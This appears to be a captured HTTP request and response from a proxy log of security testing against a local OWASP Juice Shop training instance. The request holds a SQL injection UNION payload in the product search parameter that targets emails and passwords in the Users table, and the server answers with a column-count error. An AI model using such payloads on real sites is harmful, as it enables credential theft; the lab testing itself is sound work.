@@ -1,0 +1,74 @@
+### A03_juice_4_search_union
+# ZAP history id: 7
+
+GET http://localhost:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users-- HTTP/1.1
+Host: localhost:3000
+User-Agent: python-requests/2.34.2
+Accept: */*
+Connection: keep-alive
+
+
+
+HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Wed, 18 Nov 2026 11:51:12 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+content-length: 1078
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+
